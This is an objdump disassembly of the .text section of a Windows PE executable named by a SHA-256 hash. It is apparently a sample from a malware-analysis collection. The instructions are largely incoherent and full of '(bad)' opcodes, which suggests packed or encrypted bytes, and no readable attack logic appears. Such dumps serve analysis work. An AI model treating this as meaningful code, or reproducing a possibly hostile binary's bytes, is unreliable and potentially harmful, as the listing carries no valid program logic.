
106565af9403b3d1b6d62ac444fe46460fa2946e0e269b421ad48b63218cf0f4.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	and    eax,0xf9fc32ea
  411005:	ret    0x1107
  411008:	xchg   BYTE PTR ds:0xa504337e,al
  41100e:	xchg   edx,eax
  41100f:	ins    BYTE PTR es:[edi],dx
  411010:	ret    
  411011:	inc    esp
  411012:	test   DWORD PTR [esi+0x2f57b44b],ebp
  411018:	mov    dh,BYTE PTR [edi]
  41101a:	rcl    dl,cl
  41101c:	and    cl,BYTE PTR [edx]
  41101e:	xchg   ecx,eax
  41101f:	aaa    
  411020:	dec    eax
  411021:	pop    es
  411022:	gs sti 
  411024:	popf   
  411025:	mov    edx,0x72109bbc
  41102a:	xchg   DWORD PTR [eax],esp
  41102c:	push   ecx
  41102d:	das    
  41102e:	mov    ss:0xf0cd90a2,al
  411034:	sub    bl,ch
  411036:	sbb    bl,BYTE PTR [ecx-0x37]
  411039:	and    ebx,DWORD PTR [esi+0x3f53ffba]
  41103f:	loopne 0x41100a
  411041:	sbb    eax,DWORD PTR [edi-0x40c761fa]
  411047:	mov    dh,0xe8
  411049:	inc    edi
  41104a:	frstpm(287 only) 
  41104c:	adc    al,0x91
  41104e:	cld    
  41104f:	sbb    ebp,edi
  411051:	push   eax
  411052:	xor    DWORD PTR [edx-0x2b],ebx
  411055:	repz rcl BYTE PTR [ecx],cl
  411058:	mov    ah,0xf
  41105a:	(bad)  
  41105b:	(bad)  
  41105c:	call   0x6842db46
  411061:	mov    esp,0x3a35b09a
  411066:	mov    ss,WORD PTR [ebx]
  411068:	pop    edi
  411069:	loope  0x4110d3
  41106b:	ret    
  41106c:	push   edi
  41106d:	xor    eax,0x97272343
  411072:	fisttp WORD PTR [ebp-0x444b390c]
  411078:	xchg   DWORD PTR [edx+0x6f58d31a],ecx
  41107e:	frstpm(287 only) 
  411080:	das    
  411081:	add    BYTE PTR [ecx],cl
  411083:	inc    ebp
  411084:	xlat   BYTE PTR ds:[ebx]
  411085:	jmp    0x46352cc3
  41108a:	iret   
  41108b:	jnp    0x41107a
  41108d:	rcl    BYTE PTR [ebp+0x10],0x9c
  411091:	push   ss
  411092:	cwde   
  411093:	push   esi
  411094:	inc    ebp
  411095:	pop    ss
  411096:	pop    ebx
  411097:	inc    edi
  411098:	xchg   DWORD PTR [ecx+0x6073aac0],esp
  41109e:	mov    ebx,0x1bc29a5b
  4110a3:	mov    dl,BYTE PTR [ecx-0x65]
  4110a6:	aam    0xd1
  4110a8:	addr16 pop ecx
  4110aa:	sub    eax,0x8120da0c
  4110af:	ja     0x411088
  4110b1:	sub    al,cl
  4110b3:	pop    eax
  4110b4:	call   0x2387:0x96caf937
  4110bb:	or     eax,0x6736bf7e
  4110c0:	int    0x65
  4110c2:	retf   0x23b7
  4110c5:	fsub   QWORD PTR [edi*2+0x72e414a8]
  4110cc:	mov    eax,ds:0x1ca1c743
  4110d1:	rcr    BYTE PTR [esi],1
  4110d3:	(bad)  
  4110d4:	mov    esi,0x16509172
  4110d9:	push   0x4a943373
  4110de:	push   eax
  4110df:	mov    ds:0x3e3b7ef0,al
  4110e4:	(bad)  
  4110e5:	jnp    0x411070
  4110e7:	xlat   BYTE PTR ds:[ebx]
  4110e8:	mov    ebp,0x2471f5f3
  4110ed:	nop
  4110ee:	(bad)  
  4110f0:	jnp    0x41110a
  4110f2:	mov    bh,BYTE PTR [esi-0x2a0d083e]
  4110f8:	cmp    eax,0x698ae69d
  4110fd:	pusha  
  4110fe:	dec    di
  411100:	cmp    al,0x24
  411102:	push   ebx
  411103:	jmp    0x8490:0x17849f1b
  41110a:	add    ebx,edi
  41110c:	pop    edx
  41110d:	xchg   ecx,eax
  41110e:	lods   al,BYTE PTR ds:[esi]
  41110f:	ss pop ebp
  411111:	and    DWORD PTR [edx+0x54],esi
  411114:	mov    ah,0x73
  411116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411117:	mov    BYTE PTR [edi+ebx*1],al
  41111a:	(bad)  
  41111b:	(bad)  [ecx-0x6e]
  41111e:	je     0x41110d
  411120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411121:	inc    edx
  411122:	xchg   ecx,eax
  411123:	daa    
  411124:	add    dh,0xda
  411127:	inc    ebp
  411128:	pop    edi
  411129:	ret    
  41112a:	mov    WORD PTR ds:0x249b999,ss
  411130:	addr16 out 0xfe,eax
  411133:	inc    ebp
  411134:	and    bl,BYTE PTR [esi+0x6ba43ae9]
  41113a:	(bad)  
  41113b:	xchg   edx,eax
  41113c:	sub    dh,bh
  41113e:	and    edi,eax
  411140:	pop    edi
  411141:	xchg   esp,eax
  411142:	mov    ebp,0xf61e295b
  411147:	or     cl,dl
  411149:	cmp    al,al
  41114b:	dec    esi
  41114c:	gs imul edi,ebp,0xa
  411150:	jne    0x411148
  411152:	sti    
  411153:	push   eax
  411154:	popf   
  411155:	imul   esp,DWORD PTR [eax-0x1a],0x3b3899b
  41115c:	mov    bh,0xc5
  41115e:	enter  0x9d40,0xea
  411162:	and    al,0xa4
  411164:	repnz dec esp
  411166:	lea    esi,[ecx-0x7c]
  411169:	mov    ds,WORD PTR [eax-0x586b2fcd]
  41116f:	bound  esp,QWORD PTR [edi+0x25]
  411172:	or     DWORD PTR [edx],esi
  411174:	in     eax,0xa
  411176:	add    BYTE PTR [ebx],bh
  411178:	push   cs
  411179:	jns    0x4111b8
  41117b:	xor    al,0xd5
  41117d:	out    dx,al
  41117e:	out    dx,eax
  41117f:	xchg   BYTE PTR [ebx-0x6cbbc8e],al
  411185:	and    DWORD PTR [edi],0x2bda4699
  41118b:	and    al,0x1
  41118d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41118e:	cmp    ebx,ebp
  411190:	xchg   ebx,eax
  411191:	jne    0x411118
  411193:	pop    es
  411194:	(bad)  
  411195:	out    dx,al
  411196:	arpl   WORD PTR [ecx],si
  411198:	mov    ds:0xb7c77e08,al
  41119d:	push   eax
  41119e:	xchg   ebp,esi
  4111a0:	dec    ebx
  4111a1:	sub    al,BYTE PTR [edi]
  4111a3:	scas   eax,DWORD PTR es:[edi]
  4111a4:	mov    cl,0xf
  4111a6:	or     dh,ah
  4111a8:	cmp    ebp,eax
  4111aa:	mov    dl,0x3c
  4111ac:	rol    BYTE PTR [edx],cl
  4111ae:	jp     0x4111c8
  4111b0:	outs   dx,DWORD PTR ds:[esi]
  4111b1:	xor    dh,0x6d
  4111b4:	mov    esp,0xd0ca6c98
  4111b9:	arpl   di,ax
  4111bb:	push   es
  4111bc:	xor    BYTE PTR [eax],dl
  4111be:	rcr    DWORD PTR [ecx+ecx*1],0xdb
  4111c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111c3:	stc    
  4111c4:	sub    DWORD PTR [edx+0x7f127947],edx
  4111ca:	ja     0x411188
  4111cc:	and    DWORD PTR [esi-0x41864eb5],ecx
  4111d2:	add    ecx,DWORD PTR [eax]
  4111d4:	and    dl,dh
  4111d6:	xor    DWORD PTR [ecx+eiz*8+0x28],edx
  4111da:	jmp    0xc32a:0x82970aec
  4111e1:	aad    0xdc
  4111e3:	mov    edx,0xa36e0d18
  4111e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e9:	cs jbe 0x411238
  4111ec:	dec    eax
  4111ed:	jecxz  0x4111dc
  4111ef:	add    ch,bh
  4111f1:	sti    
  4111f2:	cmp    ah,BYTE PTR [esi-0x208a2227]
  4111f8:	test   DWORD PTR [edi-0x12196d86],esp
  4111fe:	loope  0x411231
  411200:	inc    edx
  411201:	(bad)  
  411202:	(bad)  
  411203:	mov    eax,ds:0xc20a323e
  411208:	std    
  411209:	test   DWORD PTR [eax],edi
  41120b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41120c:	(bad)  
  41120e:	cmp    ecx,DWORD PTR [edx+ebp*1-0x1c]
  411212:	pop    ecx
  411213:	fs aaa 
  411215:	xor    DWORD PTR [ecx],edi
  411217:	lahf   
  411218:	add    eax,0xbb2bc574
  41121d:	inc    edx
  41121e:	cmp    dl,dl
  411220:	sub    edx,DWORD PTR [esi+esi*1]
  411223:	inc    ebp
  411224:	(bad)  
  411225:	cld    
  411226:	test   eax,0x5b79b83
  41122b:	cdq    
  41122c:	(bad)  
  41122d:	call   0x5b459f51
  411232:	call   0x2d3b:0xf08396e2
  411239:	mov    esi,0x5f4e845f
  41123e:	pop    edi
  41123f:	adc    BYTE PTR [eax+0x4229c1ad],0x48
  411246:	retf   
  411247:	cmp    eax,0xfc42fad8
  41124c:	xor    eax,0xbaf30aea
  411251:	leave  
  411252:	pop    ds
  411253:	jp     0x411234
  411255:	cmp    al,0xf2
  411257:	jb     0x41126f
  411259:	xchg   esp,eax
  41125a:	mov    BYTE PTR [ebp-0x443cec9c],bh
  411260:	enter  0xa6ad,0x6a
  411264:	int    0x38
  411266:	add    eax,0xe5ed57a1
  41126b:	xchg   BYTE PTR [edx+0x5],bh
  41126e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41126f:	inc    esp
  411270:	pop    eax
  411271:	inc    eax
  411272:	hlt    
  411273:	test   eax,0x8baca3a4
  411278:	loop   0x4112f4
  41127a:	test   BYTE PTR ds:0x9e79ea5,0x23
  411281:	fsub   st(6),st
  411283:	or     eax,0x8d522904
  411288:	nop
  411289:	cmovle ecx,edx
  41128c:	icebp  
  41128d:	mov    eax,0xb1af4de0
  411292:	pop    edx
  411293:	xchg   cl,dl
  411295:	xor    bl,BYTE PTR [eax-0xe9bafe1]
  41129b:	(bad)  
  41129c:	dec    ebx
  41129d:	sbb    cl,BYTE PTR [edi-0x3]
  4112a0:	cmc    
  4112a1:	mov    dl,0xe2
  4112a3:	add    eax,0xda8cbce7
  4112a8:	push   ds
  4112a9:	xor    al,0xae
  4112ab:	push   eax
  4112ac:	pop    eax
  4112ad:	int    0xc6
  4112af:	jge    0x4112f6
  4112b1:	pop    es
  4112b2:	adc    BYTE PTR [edi+0x22],0x59
  4112b6:	in     eax,dx
  4112b7:	push   ebx
  4112b8:	es push edi
  4112ba:	and    eax,0x24aec449
  4112bf:	inc    edi
  4112c0:	sbb    BYTE PTR [edi+0x20d13178],bh
  4112c6:	fwait
  4112c7:	ins    DWORD PTR es:[edi],dx
  4112c8:	out    dx,eax
  4112c9:	pop    edx
  4112ca:	in     eax,dx
  4112cb:	adc    ebx,DWORD PTR [eax-0x46748c55]
  4112d1:	sub    al,0xe3
  4112d3:	jp     0x411325
  4112d5:	mov    ebp,0xa8f6fda6
  4112da:	es das 
  4112dc:	mov    al,0xbd
  4112de:	and    BYTE PTR [edi-0x13d15d4e],ah
  4112e4:	imul   esp,DWORD PTR [ecx],0xfffffff8
  4112e7:	xor    edx,DWORD PTR [ecx]
  4112e9:	leave  
  4112ea:	cmp    ebx,edx
  4112ec:	inc    ebx
  4112ed:	lock test al,0xcf
  4112f0:	add    eax,0x77433397
  4112f5:	ins    BYTE PTR es:[edi],dx
  4112f6:	xchg   edi,eax
  4112f7:	sub    eax,0xa84d6076
  4112fc:	je     0x411345
  4112fe:	popf   
  4112ff:	dec    ebx
  411300:	and    eax,ebp
  411302:	add    ecx,eax
  411304:	mov    BYTE PTR [ebx],al
  411306:	(bad)
  41130a:	in     eax,dx
  41130b:	add    al,0x3e
  41130d:	repz cmp al,0x8e
  411310:	xchg   ebp,eax
  411311:	push   0x43ccd1c7
  411316:	out    dx,eax
  411317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411318:	cmp    BYTE PTR [edx-0x67],ch
  41131b:	xchg   ecx,eax
  41131c:	mov    edx,0x706eeaec
  411321:	pop    ecx
  411322:	sub    DWORD PTR [edx+0x2b],edx
  411325:	aaa    
  411326:	daa    
  411327:	pop    edx
  411328:	pop    esi
  411329:	sub    ecx,esp
  41132b:	push   ecx
  41132c:	sbb    DWORD PTR [ebx+0xf2a1dae],ecx
  411332:	leave  
  411333:	xchg   BYTE PTR [ebp-0x7],ch
  411336:	inc    esi
  411337:	sbb    ch,BYTE PTR [ebp+0x26]
  41133a:	call   DWORD PTR [esi-0x10186f3d]
  411340:	mov    ebp,0x718af4f1
  411345:	clc    
  411346:	mov    ds:0x483e1886,eax
  41134b:	fld    DWORD PTR [ebx+ecx*8]
  41134e:	xor    ch,BYTE PTR [ebp-0x38b799a4]
  411354:	test   ah,ch
  411356:	mov    dh,0x36
  411358:	jmp    0x411370
  41135a:	repz test al,0xb7
  41135d:	cmp    eax,0x11732490
  411362:	dec    ecx
  411363:	xchg   ebx,eax
  411364:	call   0xc7fc:0xa0ce5314
  41136b:	or     al,0xf7
  41136d:	int    0x7c
  41136f:	add    eax,0x76aca6a8
  411374:	push   ss
  411375:	in     al,dx
  411376:	ss cwde 
  411378:	out    0x4,al
  41137a:	inc    edi
  41137b:	pop    esp
  41137c:	out    dx,eax
  41137d:	push   ebx
  41137e:	mov    BYTE PTR [edx],ch
  411380:	scas   al,BYTE PTR es:[edi]
  411381:	push   ss
  411382:	sub    eax,0xe9ea75ac
  411387:	push   eax
  411388:	in     al,dx
  411389:	inc    edi
  41138a:	in     al,0xb1
  41138c:	sahf   
  41138d:	xchg   ecx,eax
  41138e:	scas   eax,DWORD PTR es:[edi]
  41138f:	mov    eax,0xe718a61a
  411394:	xlat   BYTE PTR ds:[ebx]
  411395:	les    edi,FWORD PTR [ebp-0x557d85de]
  41139b:	jo     0x4113dc
  41139d:	push   ss
  41139e:	cld    
  41139f:	(bad)  
  4113a0:	or     al,0x6c
  4113a2:	fistp  DWORD PTR ds:0x5c9eceec
  4113a8:	arpl   WORD PTR ds:0x32df7fed,si
  4113ae:	mov    ss,WORD PTR [ebx]
  4113b0:	ret    0xa51a
  4113b3:	stos   BYTE PTR es:[edi],al
  4113b4:	mov    WORD PTR [edi+0x4fdea520],gs
  4113ba:	pop    ecx
  4113bb:	test   BYTE PTR [eax+0x6b],0xfa
  4113bf:	mov    ds:0xd4ae1213,al
  4113c4:	pop    es
  4113c5:	js     0x41142f
  4113c7:	pop    eax
  4113c8:	inc    eax
  4113c9:	shl    DWORD PTR [esi-0xda65ebc],0x81
  4113d0:	les    edi,FWORD PTR [ecx]
  4113d2:	cli    
  4113d3:	std    
  4113d4:	cmp    al,0x47
  4113d6:	rcr    BYTE PTR [esi+edx*4],cl
  4113d9:	inc    ecx
  4113da:	aam    0xd
  4113dc:	inc    ebp
  4113dd:	lods   al,BYTE PTR ds:[esi]
  4113de:	add    BYTE PTR [esp+edi*8-0x4f9f7e1e],ch
  4113e5:	xor    BYTE PTR [edx-0x3f921219],bh
  4113eb:	repz mov dl,0x5b
  4113ee:	fcmovnbe st,st(6)
  4113f0:	jnp    0x41139c
  4113f2:	push   ss
  4113f3:	fs retf 0xbc30
  4113f7:	add    eax,0xc1593981
  4113fc:	cmp    BYTE PTR [eax+edx*4],bl
  4113ff:	aas    
  411400:	clc    
  411401:	mov    edx,?
  411403:	mov    ch,0x1a
  411405:	sahf   
  411406:	stc    
  411407:	pop    ebx
  411408:	mov    DWORD PTR [ebp-0x5b149605],esp
  41140e:	jne    0x41148f
  411410:	or     bh,ch
  411412:	fistp  QWORD PTR ds:0x876b09c6
  411418:	mov    ch,0xea
  41141a:	xchg   ebp,eax
  41141b:	inc    esp
  41141c:	inc    ebp
  41141d:	dec    ebp
  41141e:	ret    0x96a5
  411421:	mov    WORD PTR [ecx-0x2b64bd19],gs
  411427:	hlt    
  411428:	pop    ecx
  411429:	stos   DWORD PTR es:[edi],eax
  41142a:	xor    eax,0x4d098d0a
  41142f:	in     eax,0xfd
  411431:	in     al,0x85
  411433:	inc    esi
  411434:	mov    BYTE PTR [ebp-0x79c4f302],cl
  41143a:	cld    
  41143b:	adc    eax,0x60d2c6a4
  411440:	jb     0x411472
  411442:	dec    esp
  411443:	mov    esi,0x30d8c06f
  411448:	add    eax,0x69d29fbc
  41144d:	add    eax,0xa8b24907
  411452:	push   ds
  411453:	mul    ch
  411455:	neg    DWORD PTR ds:0x77c2f47
  41145b:	pop    edi
  41145c:	lods   eax,DWORD PTR ds:[esi]
  41145d:	jl     0x4113e3
  41145f:	ret    0x4812
  411462:	dec    eax
  411463:	lods   eax,DWORD PTR ds:[esi]
  411464:	stc    
  411465:	aaa    
  411466:	mov    eax,ds:0x970d17ef
  41146b:	scas   eax,DWORD PTR es:[edi]
  41146c:	ins    BYTE PTR es:[edi],dx
  41146d:	and    DWORD PTR [edx],0xfffffffc
  411470:	cmp    BYTE PTR es:[ebx-0x1d],dh
  411474:	mov    ebp,0xe0c02b91
  411479:	xchg   edx,eax
  41147a:	scas   al,BYTE PTR es:[edi]
  41147b:	popa   
  41147c:	lods   al,BYTE PTR ds:[esi]
  41147d:	test   dl,bl
  41147f:	sti    
  411480:	pusha  
  411481:	test   ebx,0x30a70023
  411487:	mov    ecx,0x25c13e38
  41148c:	retf   
  41148d:	dec    eax
  41148e:	and    DWORD PTR ds:[ebp-0x36],eax
  411492:	jne    0x4114ed
  411494:	sub    DWORD PTR [esi+0x58],esp
  411497:	cli    
  411498:	arpl   cx,bx
  41149a:	mov    eax,0x4b22002a
  41149f:	pop    edi
  4114a0:	push   cs
  4114a1:	stc    
  4114a2:	inc    ebp
  4114a3:	adc    eax,0x7f2b9760
  4114a8:	sahf   
  4114a9:	and    ebx,eax
  4114ab:	push   edx
  4114ac:	test   DWORD PTR [ebx],0x8e7fe016
  4114b2:	pop    ds
  4114b3:	adc    BYTE PTR [edx+0x7],ah
  4114b6:	arpl   di,ax
  4114b8:	cmp    al,0xae
  4114ba:	adc    bh,BYTE PTR [eax]
  4114bc:	xchg   ebp,eax
  4114bd:	push   ebp
  4114be:	div    DWORD PTR [ebp-0x108f6bb8]
  4114c4:	xor    DWORD PTR [eax+0x28],edi
  4114c7:	pop    ss
  4114c8:	sbb    esp,DWORD PTR [eax+0x57]
  4114cb:	and    al,0x6b
  4114cd:	fild   DWORD PTR [edi]
  4114cf:	xchg   edx,eax
  4114d0:	nop
  4114d1:	es (bad) 
  4114d3:	jno    0x4114ec
  4114d5:	aaa    
  4114d6:	fld    TBYTE PTR [esi+0x77]
  4114d9:	sub    BYTE PTR [edx-0x33],dl
  4114dc:	fbstp  TBYTE PTR [ebx-0x2dd32ca3]
  4114e2:	(bad)  
  4114e3:	inc    DWORD PTR [edx-0x15]
  4114e6:	aaa    
  4114e7:	mov    ah,0xd8
  4114e9:	pop    esi
  4114ea:	push   ebp
  4114eb:	in     eax,0x1d
  4114ed:	aad    0x9a
  4114ef:	clc    
  4114f0:	inc    ecx
  4114f1:	sub    ah,0xf7
  4114f4:	push   ss
  4114f5:	add    al,0x1e
  4114f7:	or     esp,DWORD PTR [esi-0x78]
  4114fa:	inc    ebx
  4114fb:	add    ecx,DWORD PTR [ecx+0x36d86d38]
  411501:	cmp    DWORD PTR [ecx+ebx*8+0x6a],esp
  411505:	sahf   
  411506:	cmp    ch,BYTE PTR [esi]
  411508:	cmp    BYTE PTR [esi],al
  41150a:	mov    ah,0x35
  41150c:	mov    esp,0xbda88922
  411511:	dec    esp
  411512:	inc    esi
  411513:	dec    esi
  411514:	add    al,0xff
  411516:	xchg   ebp,eax
  411517:	dec    ebp
  411518:	shl    BYTE PTR [ebp+0x14120391],1
  41151e:	cmp    eax,0x3a816ade
  411523:	inc    ebx
  411524:	leave  
  411525:	test   al,0xbb
  411527:	mov    bh,0xb4
  411529:	rcr    esp,1
  41152b:	ret    0xc77b
  41152e:	lahf   
  41152f:	sub    eax,0x179e00e9
  411534:	sahf   
  411535:	cmp    al,0x8c
  411537:	mov    bh,0x5d
  411539:	push   0x2724939a
  41153e:	lea    ecx,[esi-0x318eeb4]
  411544:	jns    0x41150a
  411546:	inc    esp
  411547:	lods   al,BYTE PTR ds:[esi]
  411548:	gs inc eax
  41154a:	in     eax,0x33
  41154c:	fcmovnu st,st(0)
  41154e:	push   cs
  41154f:	cdq    
  411550:	xchg   ebx,eax
  411551:	xchg   ebx,edi
  411553:	mov    eax,ds:0xf20640d4
  411558:	mov    DWORD PTR [ecx+0x7eb7e46],esp
  41155e:	fcom   DWORD PTR [eax]
  411560:	outs   dx,DWORD PTR ds:[esi]
  411561:	fs (bad) 
  411563:	mov    ch,0x89
  411565:	mov    ebp,0x7c369509
  41156a:	mul    ch
  41156c:	popf   
  41156d:	xor    esp,DWORD PTR [edx-0x69]
  411570:	push   ss
  411571:	and    al,0xa5
  411573:	mov    ds:0x2761fe51,al
  411578:	fldcw  WORD PTR [ebp+0x25]
  41157b:	loop   0x411551
  41157d:	mov    ch,0xb5
  41157f:	and    edx,esi
  411581:	and    edi,eax
  411583:	jecxz  0x41157a
  411585:	sahf   
  411586:	jge    0x411601
  411588:	shl    DWORD PTR [esi-0x404398b7],0x8c
  41158f:	cmp    BYTE PTR [ebx-0x27],ch
  411592:	sbb    al,0xaa
  411594:	loopne 0x411593
  411596:	ss scas eax,DWORD PTR es:[edi]
  411598:	dec    ecx
  411599:	or     BYTE PTR [esi-0x85e52e4],bh
  41159f:	add    BYTE PTR [esi],al
  4115a1:	adc    bh,BYTE PTR [edi+ebx*2-0x5fa40ceb]
  4115a8:	fisttp WORD PTR [esi-0x56967ec0]
  4115ae:	xor    DWORD PTR [eax+ecx*4-0x3327d2fb],ecx
  4115b5:	push   eax
  4115b6:	ins    BYTE PTR es:[edi],dx
  4115b7:	xor    esp,ecx
  4115b9:	pop    esi
  4115ba:	rep lods eax,DWORD PTR ds:[esi]
  4115bc:	cwde   
  4115bd:	les    ebp,FWORD PTR [eax-0x7181f7]
  4115c3:	mov    edx,0x4869c946
  4115c8:	sbb    eax,0x25093091
  4115cd:	xchg   esi,eax
  4115ce:	pop    esp
  4115cf:	je     0x411612
  4115d1:	xor    DWORD PTR ds:[esi+0x77],esp
  4115d5:	fstp   TBYTE PTR [ebp+edi*4+0x34]
  4115d9:	mov    bh,0xfc
  4115db:	jecxz  0x411648
  4115dd:	(bad)  
  4115de:	cmp    eax,DWORD PTR [edi+0x6e]
  4115e1:	xchg   BYTE PTR [edi],dl
  4115e3:	mov    ch,0xa5
  4115e5:	pop    ds
  4115e6:	aaa    
  4115e7:	sbb    BYTE PTR ds:0xbdf0e179,ch
  4115ed:	outs   dx,DWORD PTR ds:[esi]
  4115ee:	jb     0x411659
  4115f0:	outs   dx,DWORD PTR ds:[esi]
  4115f1:	sbb    cl,BYTE PTR ds:0x25aa97cc
  4115f7:	add    al,0x5a
  4115f9:	fld    TBYTE PTR [eax+0x7681e4d0]
  4115ff:	dec    eax
  411600:	and    bl,bl
  411602:	mov    esp,0x9efd6504
  411607:	adc    dh,0x6d
  41160a:	dec    esi
  41160b:	cmp    BYTE PTR [eax],dh
  41160d:	and    bh,BYTE PTR [esi]
  41160f:	pop    ss
  411610:	shl    DWORD PTR [esi+0x253f54bb],0x5
  411617:	sub    dl,BYTE PTR cs:[edx+0x7a2b3bee]
  41161e:	lahf   
  41161f:	sar    BYTE PTR [ecx+edi*2+0x59d46923],0x41
  411627:	js     0x411658
  411629:	inc    eax
  41162a:	jo     0x41168e
  41162c:	outs   dx,DWORD PTR ds:[esi]
  41162d:	lock stos DWORD PTR es:[edi],eax
  41162f:	(bad)  
  411630:	xlat   BYTE PTR ds:[ebx]
  411631:	mov    edi,0x5c850611
  411636:	test   al,0xb5
  411638:	jg     0x411685
  41163a:	jne    0x411674
  41163c:	sbb    DWORD PTR [eax+0x332260de],0xebf5a893
  411646:	cmp    BYTE PTR [ebp-0x67],dh
  411649:	pop    ds
  41164a:	pop    edi
  41164b:	and    ch,BYTE PTR [esp+edi*1]
  41164e:	dec    esp
  41164f:	cmp    eax,edx
  411651:	cmc    
  411652:	ja     0x411669
  411654:	data16 jp 0x4116d6
  411657:	mov    dl,al
  411659:	das    
  41165a:	add    ah,ah
  41165c:	mov    ebp,0xc7c9a50c
  411661:	hlt    
  411662:	ret    0x87fa
  411665:	gs cmp esi,ebp
  411668:	(bad)  
  411669:	adc    eax,0xf64ca0d0
  41166e:	hlt    
  41166f:	add    DWORD PTR [ebx],ecx
  411671:	inc    eax
  411672:	retf   0x35f3
  411675:	arpl   WORD PTR [eax-0x60],sp
  411678:	mov    ebx,0x2a576e1b
  41167d:	cmp    ch,ch
  41167f:	adc    eax,DWORD PTR [edx+0xba52b77]
  411685:	ret    0x154d
  411688:	icebp  
  411689:	retf   0xb7de
  41168c:	fcmovu st,st(4)
  41168e:	out    dx,al
  41168f:	mov    ecx,0xf915bff3
  411694:	jle    0x4116db
  411696:	mov    ah,0xfd
  411698:	lea    esi,[ecx+0x4302109a]
  41169e:	jmp    0x52b03fe7
  4116a3:	outs   dx,BYTE PTR ds:[esi]
  4116a4:	sbb    al,0x8e
  4116a6:	pop    ss
  4116a7:	sub    DWORD PTR [edx-0x53],0xcca9bd34
  4116ae:	stos   BYTE PTR es:[edi],al
  4116af:	rcl    BYTE PTR [esp+eax*1-0x4],1
  4116b3:	ds sbb al,0x5f
  4116b6:	imul   eax,DWORD PTR [ebp-0x6d],0xffffff85
  4116ba:	mov    ah,0x59
  4116bc:	mov    esp,0xbefc9042
  4116c1:	enter  0x8904,0x0
  4116c5:	push   edx
  4116c6:	jne    0x411740
  4116c8:	mov    esp,0xb75c4c01
  4116cd:	lods   al,BYTE PTR ds:[esi]
  4116ce:	jle    0x411747
  4116d0:	adc    al,cl
  4116d2:	popf   
  4116d3:	cmp    bl,BYTE PTR [ebx+0xb]
  4116d6:	call   0xe036648
  4116db:	or     al,0x46
  4116dd:	ja     0x41166f
  4116df:	add    DWORD PTR [ebx-0x55],eax
  4116e2:	cmp    eax,0xddfb8c29
  4116e7:	sbb    eax,0x756700dc
  4116ec:	loop   0x411709
  4116ee:	push   0xffffffef
  4116f0:	in     eax,dx
  4116f1:	popf   
  4116f2:	fld    TBYTE PTR [ebx+0x6f22906f]
  4116f8:	add    al,0x7f
  4116fa:	push   esi
  4116fb:	scas   al,BYTE PTR es:[edi]
  4116fc:	mov    ch,0x7e
  4116fe:	cmp    BYTE PTR [ecx-0x42],0x19
  411702:	adc    al,0xb6
  411704:	rol    DWORD PTR [ebp+0x38990498],cl
  41170a:	fsub   st,st(5)
  41170c:	aad    0xc0
  41170e:	js     0x4116bf
  411710:	lea    esp,[edi+0x1a9d8e00]
  411716:	icebp  
  411717:	add    ebx,DWORD PTR [ebx+0x5ded0ae0]
  41171d:	addr16 xchg edi,eax
  41171f:	out    dx,eax
  411720:	stos   BYTE PTR es:[edi],al
  411721:	out    0xc2,al
  411723:	int    0x72
  411725:	xor    ch,BYTE PTR [ecx+0x24608071]
  41172b:	sub    BYTE PTR [ecx],bl
  41172d:	mov    DWORD PTR [ebx],0x69bae0d4
  411733:	daa    
  411734:	out    0xb9,al
  411736:	push   edi
  411737:	xor    edi,DWORD PTR [ebx+ecx*2+0x60]
  41173b:	imul   esp,DWORD PTR [eax],0x78
  41173e:	daa    
  41173f:	es in  al,dx
  411741:	sti    
  411742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411743:	add    al,0x81
  411745:	mov    ebp,0xc1813633
  41174a:	and    DWORD PTR [ebx-0x3b],ecx
  41174d:	dec    esi
  41174e:	push   edx
  41174f:	push   ebp
  411750:	sar    DWORD PTR [esi],cl
  411752:	add    DWORD PTR [ecx],edx
  411754:	pop    edi
  411755:	cmp    eax,0x4b6ea21e
  41175a:	push   cs
  41175b:	adc    bh,BYTE PTR cs:0x502a3578
  411762:	add    edx,DWORD PTR [ebx-0x266464b9]
  411768:	fild   WORD PTR [edi-0x51e31341]
  41176e:	jmp    0x3da8e3c7
  411773:	test   eax,0xc5e3adf7
  411778:	dec    esi
  411779:	idiv   DWORD PTR [edx+0x6a]
  41177c:	in     al,dx
  41177d:	pop    edi
  41177e:	pushf  
  41177f:	jae    0x4117db
  411781:	jge    0x4117fb
  411783:	arpl   WORD PTR [eax+ebp*2-0x75],bp
  411787:	sbb    DWORD PTR [edi+ebx*1],ecx
  41178a:	repnz xor eax,0x6a1ee4cb
  411790:	je     0x411796
  411792:	inc    ebp
  411793:	sub    DWORD PTR [esi+0x473c4138],ecx
  411799:	repnz pop esi
  41179b:	dec    ebx
  41179c:	ret    
  41179d:	mov    eax,0x5775b7e8
  4117a2:	and    BYTE PTR ds:0x7fa60e1,cl
  4117a8:	imul   ebp,DWORD PTR [edi+0x1036fb99],0xffffffbb
  4117af:	fisttp DWORD PTR [esp]
  4117b2:	pop    ebp
  4117b3:	pop    ds
  4117b4:	or     dh,BYTE PTR [ecx+esi*8]
  4117b7:	sbb    eax,0x5725c9c
  4117bc:	imul   DWORD PTR [edi]
  4117be:	jmp    0x411799
  4117c0:	sub    ecx,DWORD PTR [ebx]
  4117c2:	lods   al,BYTE PTR ds:[esi]
  4117c3:	ins    DWORD PTR es:[edi],dx
  4117c4:	jne    0x41176e
  4117c6:	stos   DWORD PTR es:[edi],eax
  4117c7:	cs aas 
  4117c9:	add    eax,0x849d02af
  4117ce:	add    al,0xfb
  4117d0:	sti    
  4117d1:	jo     0x41176d
  4117d3:	std    
  4117d4:	adc    eax,0xcaf5dc0
  4117d9:	in     eax,dx
  4117da:	xchg   BYTE PTR es:[ebx+0x4fdba0c7],bh
  4117e1:	mov    al,0x61
  4117e3:	pop    edi
  4117e4:	push   esi
  4117e5:	sbb    edx,ecx
  4117e7:	jae    0x4117ee
  4117e9:	xor    eax,0x45c27450
  4117ee:	rcl    BYTE PTR [eax+0x72],cl
  4117f1:	add    eax,0x88903a28
  4117f6:	mov    ds:0xdeb3a1f8,al
  4117fb:	bswap  eax
  4117fd:	btr    edi,ebx
  411800:	adc    dl,dh
  411802:	(bad)
